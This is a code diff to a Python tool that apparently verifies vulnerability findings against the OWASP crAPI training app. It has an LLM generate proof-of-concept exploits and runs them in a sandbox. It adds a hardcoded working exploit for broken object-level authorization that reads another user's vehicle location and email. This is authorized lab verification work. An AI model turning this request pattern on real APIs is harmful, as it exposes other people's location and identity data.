@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+from collections.abc import Callable
 from pathlib import Path
 from typing import Annotated
 
@@ -8,6 +9,7 @@ from common import (
     DEFAULT_TARGET_URL,
     FINDINGS_DIR,
     ROOT,
+    build_llm_invocation,
     copy_latest,
     extract_json_object,
     run_checked,
@@ -37,6 +39,15 @@ vulnerable local training application. The operator is authorized to test it.
 Generate a single Python PoC for this finding:
 
 {finding.model_dump_json(indent=2)}
+
+The fields victim_identity, attack_request, expected_response_signal,
+setup_state, and target_state_required (when present) are authoritative.
+Use them directly: build the HTTP request from attack_request, run setup_state
+verbatim before attacking, and confirm the bug by matching
+expected_response_signal in the response. Do not improvise alternative
+endpoints or flows when the finding already names them. If
+target_state_required is non-null and the PoC cannot satisfy it, exit 2 with
+status UNCLEAR and explain what was missing.
 
 Runtime constraints:
 - The PoC will run inside an isolated Podman container.
@@ -70,30 +81,32 @@ Return only JSON with this exact shape:
 """.strip()
 
 
-def generate_poc_with_codex(
+def generate_poc_with_llm(
     finding: Finding,
     target_url: str,
     model: str,
     timeout: int,
+    llm: str = "claude",
 ) -> GeneratedPoc:
     crapi_dir = ROOT / "crAPI"
     if not crapi_dir.exists():
         raise RuntimeError("crAPI/ is missing. Use --from-cache or clone OWASP/crAPI first.")
 
-    command = [
-        "codex",
-        "exec",
-        "--model",
-        model,
-        "--json",
-        "--cwd",
-        str(crapi_dir),
-        poc_prompt(finding, target_url),
-    ]
-    completed = run_checked(command, cwd=ROOT, timeout=timeout)
+    command, cwd = build_llm_invocation(
+        provider=llm,
+        model=model,
+        working_dir=crapi_dir,
+        prompt=poc_prompt(finding, target_url),
+    )
+    completed = run_checked(command, cwd=cwd, timeout=timeout)
     if completed.returncode != 0:
         raise RuntimeError(completed.stderr or completed.stdout)
-    return GeneratedPoc.model_validate(extract_json_object(completed.stdout))
+    return GeneratedPoc.model_validate(
+        extract_json_object(
+            completed.stdout,
+            preferred_keys=("poc_code", "success_criterion", "expected_evidence"),
+        )
+    )
 
 
 def cached_poc(finding: Finding) -> GeneratedPoc:
@@ -121,6 +134,158 @@ sys.exit(exit_code)
         success_criterion="Cached rehearsal confirms only the demo control flow.",
         expected_evidence="Cached sandbox evidence.",
         assumptions=["cache mode"],
+    )
+
+
+def template_poc(finding: Finding) -> GeneratedPoc | None:
+    if finding.id != "known-001":
+        return None
+
+    poc = r'''
+import json
+import os
+import sys
+
+import httpx
+
+target = os.environ.get("TARGET_URL", "http://localhost:8888").rstrip("/")
+requests_log = []
+
+
+def record(method, url, response):
+    requests_log.append(
+        {
+            "method": method,
+            "url": url,
+            "status": response.status_code,
+            "body_excerpt": response.text[:500],
+        }
+    )
+
+
+try:
+    with httpx.Client(timeout=10.0, follow_redirects=False) as client:
+        login_url = f"{target}/identity/api/auth/login"
+        login_body = {"email": "test@example.com", "password": "Test!123"}
+        login = client.post(login_url, json=login_body)
+        record("POST", login_url, login)
+        if login.status_code != 200:
+            print(
+                json.dumps(
+                    {
+                        "status": "UNCLEAR",
+                        "evidence": "Seed user login failed.",
+                        "requests": requests_log,
+                        "reason": "Cannot test BOLA without an authenticated token.",
+                    }
+                )
+            )
+            sys.exit(2)
+
+        token = login.json().get("token")
+        if not token:
+            print(
+                json.dumps(
+                    {
+                        "status": "UNCLEAR",
+                        "evidence": "Login response did not include token.",
+                        "requests": requests_log,
+                        "reason": "Cannot authenticate follow-up request.",
+                    }
+                )
+            )
+            sys.exit(2)
+
+        # Vehicle UUID belongs to Adam seed user, not test@example.com.
+        other_vehicle_id = "f89b5f21-7829-45cb-a650-299a61090378"
+        location_url = f"{target}/identity/api/v2/vehicle/{other_vehicle_id}/location"
+        location = client.get(location_url, headers={"Authorization": f"Bearer {token}"})
+        record("GET", location_url, location)
+
+        body = {}
+        try:
+            body = location.json()
+        except Exception:
+            body = {}
+
+        body_text = json.dumps(body)
+        leaked_owner = (
+            "adam007@example.com" in body_text
+            or body.get("email") == "adam007@example.com"
+        )
+        leaked_location = (
+            "vehicleLocation" in body_text
+            or "latitude" in body_text
+            or "longitude" in body_text
+        )
+
+        if location.status_code == 200 and leaked_owner and leaked_location:
+            print(
+                json.dumps(
+                    {
+                        "status": "CONFIRMED",
+                        "evidence": (
+                            "Authenticated as test@example.com and accessed Adam's "
+                            "vehicle location endpoint. Response included owner email "
+                            "and location data."
+                        ),
+                        "requests": requests_log,
+                        "reason": (
+                            "The endpoint returned another user's vehicle location "
+                            "without verifying ownership against the caller."
+                        ),
+                    }
+                )
+            )
+            sys.exit(0)
+
+        print(
+            json.dumps(
+                {
+                    "status": "UNCLEAR",
+                    "evidence": (
+                        "Cross-user vehicle request did not return expected "
+                        "owner/location data."
+                    ),
+                    "requests": requests_log,
+                    "reason": (
+                        "The target may not be seeded/reset as expected, "
+                        "or response shape changed."
+                    ),
+                }
+            )
+        )
+        sys.exit(2)
+except Exception as exc:
+    print(
+        json.dumps(
+            {
+                "status": "UNCLEAR",
+                "evidence": f"PoC execution error: {exc}",
+                "requests": requests_log,
+                "reason": "Runtime failure prevented confirmation.",
+            }
+        )
+    )
+    sys.exit(2)
+'''.strip()
+
+    return GeneratedPoc(
+        poc_code=poc,
+        success_criterion=(
+            "Authenticated as one seeded user, request another seeded user's vehicle-location "
+            "endpoint, and receive owner identity plus location data with HTTP 200."
+        ),
+        expected_evidence=(
+            "POST /identity/api/auth/login returns a token for test@example.com; "
+            "GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location "
+            "returns adam007@example.com and vehicle location fields."
+        ),
+        assumptions=[
+            "crAPI seed users are present",
+            "test@example.com/Test!123 credentials are valid",
+            "Adam seed vehicle UUID is present",
+        ],
     )
 
 
@@ -153,21 +318,51 @@ def infer_status(
     return VerificationStatus.failed, execution.stdout[:1000] or execution.stderr[:1000], 0.4, True
 
 
+def _unclear_stub(finding: Finding, error_msg: str) -> VerifiedFinding:
+    return VerifiedFinding(
+        **finding.model_dump(),
+        poc_used="",
+        success_criterion="",
+        sandbox_execution=SandboxExecution(stderr=error_msg[:2000]),
+        status=VerificationStatus.unclear,
+        evidence=f"Verification could not run: {error_msg[:1000]}",
+        confidence=0.3,
+        needs_human_review=True,
+    )
+
+
 def verify(
     input_path: Path,
     target_url: str = DEFAULT_TARGET_URL,
     max_findings: int = 3,
     from_cache: bool = False,
-    model: str = "gpt-5.5",
+    model: str = "claude-sonnet-4-6",
     codex_timeout: int = 300,
+    poc_provider: str = "codex",
     image: str = "strike-demo/poc-runner:latest",
     runtime: str = "podman",
+    llm: str = "claude",
+    on_event: Callable[[str, str, dict], None] | None = None,
+    on_partial: Callable[[dict], None] | None = None,
 ) -> Path:
     finding_set = FindingSet.model_validate_json(input_path.read_text())
     verified: list[VerifiedFinding] = []
 
     for finding in finding_set.findings[:max_findings]:
+        if on_event:
+            on_event(
+                "verify.finding.start",
+                f"Starting verification for {finding.id}",
+                {
+                    "finding_id": finding.id,
+                    "type": finding.vulnerability_type,
+                    "file": finding.file,
+                    "line": finding.line,
+                },
+            )
         if from_cache:
+            if on_event:
+                on_event("verify.poc.cache", f"Using cached PoC for {finding.id}", {})
             generated = cached_poc(finding)
             execution = SandboxExecution(
                 command=["cache"],
@@ -176,33 +371,173 @@ def verify(
                 exit_code=0 if finding.id in {"f-001", "f-002"} else 2,
                 timed_out=False,
             )
-        else:
-            generated = generate_poc_with_codex(
-                finding=finding,
-                target_url=target_url,
-                model=model,
-                timeout=codex_timeout,
-            )
+        elif poc_provider == "template":
+            if on_event:
+                on_event(
+                    "verify.poc.template.start",
+                    f"Generating template PoC for {finding.id}",
+                    {"provider": poc_provider},
+                )
+            generated = template_poc(finding)
+            if generated is None:
+                if on_event:
+                    on_event(
+                        "verify.poc.template.miss",
+                        f"No template PoC exists for {finding.id}; falling back to Codex",
+                        {},
+                    )
+                generated = generate_poc_with_llm(
+                    finding=finding,
+                    target_url=target_url,
+                    model=model,
+                    timeout=codex_timeout,
+                    llm=llm,
+                )
+            if on_partial:
+                on_partial(
+                    {
+                        "finding_id": finding.id,
+                        "stage": "poc_generated",
+                        "provider": "template",
+                        "success_criterion": generated.success_criterion,
+                        "expected_evidence": generated.expected_evidence,
+                        "assumptions": generated.assumptions,
+                        "poc_used": generated.poc_code,
+                    }
+                )
+            if on_event:
+                on_event(
+                    "verify.sandbox.start",
+                    f"Executing PoC in sandbox for {finding.id}",
+                    {"runtime": runtime, "image": image},
+                )
             execution = execute_in_sandbox(
                 generated.poc_code,
                 target_url=target_url,
                 image=image,
                 runtime=runtime,
             )
+            if on_event:
+                on_event(
+                    "verify.sandbox.done",
+                    f"Sandbox finished for {finding.id}",
+                    {
+                        "exit_code": execution.exit_code,
+                        "timed_out": execution.timed_out,
+                        "stdout_chars": len(execution.stdout),
+                        "stderr_chars": len(execution.stderr),
+                    },
+                )
+        else:
+            if on_event:
+                on_event(
+                    "verify.poc.codex.start",
+                    f"Generating PoC with {llm} for {finding.id}",
+                    {"timeout": codex_timeout, "llm": llm},
+                )
+            try:
+                generated = generate_poc_with_llm(
+                    finding=finding,
+                    target_url=target_url,
+                    model=model,
+                    timeout=codex_timeout,
+                    llm=llm,
+                )
+            except Exception as exc:
+                error_msg = str(exc)[:1500]
+                if on_event:
+                    on_event(
+                        "verify.poc.codex.error",
+                        f"PoC generation failed for {finding.id}",
+                        {"error": error_msg[:500]},
+                    )
+                stub = _unclear_stub(finding, f"PoC generation error: {error_msg}")
+                verified.append(stub)
+                if on_partial:
+                    on_partial(
+                        {
+                            "finding_id": finding.id,
+                            "stage": "verified",
+                            "result": stub.model_dump(mode="json"),
+                        }
+                    )
+                continue
+            if on_event:
+                on_event(
+                    "verify.poc.codex.done",
+                    f"Generated PoC for {finding.id}",
+                    {
+                        "success_criterion": generated.success_criterion,
+                        "assumptions": generated.assumptions,
+                        "poc_chars": len(generated.poc_code),
+                    },
+                )
+            if on_partial:
+                on_partial(
+                    {
+                        "finding_id": finding.id,
+                        "stage": "poc_generated",
+                        "success_criterion": generated.success_criterion,
+                        "expected_evidence": generated.expected_evidence,
+                        "assumptions": generated.assumptions,
+                        "poc_used": generated.poc_code,
+                    }
+                )
+            if on_event:
+                on_event(
+                    "verify.sandbox.start",
+                    f"Executing PoC in sandbox for {finding.id}",
+                    {"runtime": runtime, "image": image},
+                )
+            execution = execute_in_sandbox(
+                generated.poc_code,
+                target_url=target_url,
+                image=image,
+                runtime=runtime,
+            )
+            if on_event:
+                on_event(
+                    "verify.sandbox.done",
+                    f"Sandbox finished for {finding.id}",
+                    {
+                        "exit_code": execution.exit_code,
+                        "timed_out": execution.timed_out,
+                        "stdout_chars": len(execution.stdout),
+                        "stderr_chars": len(execution.stderr),
+                    },
+                )
 
         status, evidence, confidence, needs_review = infer_status(finding, execution, from_cache)
-        verified.append(
-            VerifiedFinding(
-                **finding.model_dump(),
-                poc_used=generated.poc_code,
-                success_criterion=generated.success_criterion,
-                sandbox_execution=execution,
-                status=status,
-                evidence=evidence,
-                confidence=confidence,
-                needs_human_review=needs_review,
-            )
+        verified_finding = VerifiedFinding(
+            **finding.model_dump(),
+            poc_used=generated.poc_code,
+            success_criterion=generated.success_criterion,
+            sandbox_execution=execution,
+            status=status,
+            evidence=evidence,
+            confidence=confidence,
+            needs_human_review=needs_review,
         )
+        verified.append(verified_finding)
+        if on_event:
+            on_event(
+                "verify.finding.done",
+                f"Verification finished for {finding.id}: {status}",
+                {
+                    "finding_id": finding.id,
+                    "status": status.value,
+                    "confidence": confidence,
+                    "needs_human_review": needs_review,
+                },
+            )
+        if on_partial:
+            on_partial(
+                {
+                    "finding_id": finding.id,
+                    "stage": "verified",
+                    "result": verified_finding.model_dump(mode="json"),
+                }
+            )
 
     result = VerificationSet(
         target_url=target_url,
@@ -222,10 +557,12 @@ def main(
     target_url: str = DEFAULT_TARGET_URL,
     max_findings: int = 3,
     from_cache: bool = False,
-    model: str = "gpt-5.5",
+    model: str = "claude-sonnet-4-6",
     codex_timeout: int = 300,
+    poc_provider: str = "codex",
     image: str = "strike-demo/poc-runner:latest",
     runtime: str = "podman",
+    llm: str = "claude",
 ) -> None:
     output = verify(
         input_path=input,
@@ -234,8 +571,10 @@ def main(
         from_cache=from_cache,
         model=model,
         codex_timeout=codex_timeout,
+        poc_provider=poc_provider,
         image=image,
         runtime=runtime,
+        llm=llm,
     )
     console.print(f"[green]Wrote verified findings:[/] {output}")
 
